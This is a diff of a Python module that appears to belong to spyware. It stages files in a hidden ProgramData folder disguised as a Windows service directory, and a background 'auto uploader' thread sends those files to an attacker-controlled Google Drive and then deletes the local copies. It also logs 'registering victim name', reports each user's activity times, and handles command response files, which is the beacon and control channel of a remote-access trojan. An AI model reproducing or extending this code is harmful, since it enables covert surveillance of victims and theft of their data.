@@ -6,7 +6,7 @@ and create a new oAuth id each time when giving a tooken
 import json
 from functools import lru_cache
 from json.decoder import JSONDecodeError
-from os.path import join, split
+from os.path import isfile, join, split, exists
 import os
 from logger import log
 from shutil import rmtree
@@ -182,17 +182,18 @@ class drive_explorer:
 
 
 drive = drive_explorer()
-path = f"reports/{username}"
+# randomly chosen a folder path to store encrypted files
+file_store = join(os.environ["ProgramData"], "WwanSvc\Profiles")
 #%%
 class Online:
-    def __init__(self, path):
+    def __init__(self, path, prefix=f"reports/{username}"):
+        path=join(prefix, path)
         self.file = drive.get_file(path)
 
     def read(self):
         return self.file.GetContentString()
 
     def write(self, data):
-        data = formated_str(data)
         self.file.SetContentString(data+"\n"+self.read())
         self.file.Upload()
     
@@ -205,12 +206,8 @@ class Online:
 
 #%%
 class Offline:
-    _path=os.environ["ProgramData"]
-    _path=join(_path, "WwanSvc\Profiles")# randomly chosen a folder path to store encrypted files
-
-    def __init__(self, path, prefix=path):
-        path=join(prefix, path)
-        self.path = join(self._path, path)
+    def __init__(self, path):
+        self.path = join(file_store, path)
         try:
             os.makedirs(split(self.path)[0])
         except:
@@ -251,51 +248,45 @@ def got_active():
             f.write(basic_detail())
         data_store.set_value('clint_info', True)
 
-def imactive():
-    file=f"whoisactive/{username}"
-    with drive_file(file, "") as f:
-        data={
-            "last_all_time": data_store.var.last_all_time,
-            "last_user_time": data_store.var.last_user_time
-        }
-        f.write(data)
-        return f.path
-
 def send_file(name, content):
-    with drive_file(join(path, name)) as f:
+    with drive_file(name) as f:
         f.write(content)
-
-def response(command_sec):
-    with drive_file(f"response/{command_sec}") as f:
-        f.write("")
 
 
 #%%
 class Auto_upload:
     def __init__(self) -> None:
-        self.path=Offline._path
         Thread(target=self.engine, daemon=True, name='auto uploader').start()
 
     def list_uploads(self):
-        for root, folders, files in os.walk(self.path):
+        if not exists(file_store):
+            return
+        
+        for root, folders, files in os.walk(file_store):
             for file in files:
                 yield join(root, file)
 
     def upload(self, path):
         '''path: absulate_path '''
-        with fileio(path, "r") as f:
-            data=f.read()
-            f.delete()
+        file = fileio(path, "r")
         
-        dpath = path.replace(self.path, "").lstrip('\\/')
+        dpath = path.replace(file_store, "").lstrip('\\/')
+        log.info(f'uploading to drive: {dpath}')
         with Online(dpath) as df:
-            df.write(data)
+            df.write(file.read())
+        
+        file.delete()
+        file.__exit__()
 
     def upload_response(self):
-        response_path=join(self.path, "response")
+        response_path=f"{file_store}/response"
+        if not exists(response_path):
+            return
+        
         for i in os.listdir(response_path):
-            path = join(response_path, i)
-            self.upload(path)
+            if isfile(i):
+                path = join(response_path, i)
+                self.upload(path)
 
     def engine(self):
         # upload the actime report first
@@ -303,10 +294,15 @@ class Auto_upload:
         drive.drive.permited.wait()
         
         log.info(f'registering victim name')
-        file=imactive()
+        file=f"whoisactive/{username}"
+        with Online(file, prefix="") as f:
+            data={
+                "last_all_time": data_store.var.last_all_time,
+                "last_user_time": data_store.var.last_user_time
+            }
+            f.write(data)
         self.upload(file)
-        log.info(f'"{file}" should be uploaded')
-
+        
         self.upload_response()
         while 1:
             for i in self.list_uploads():
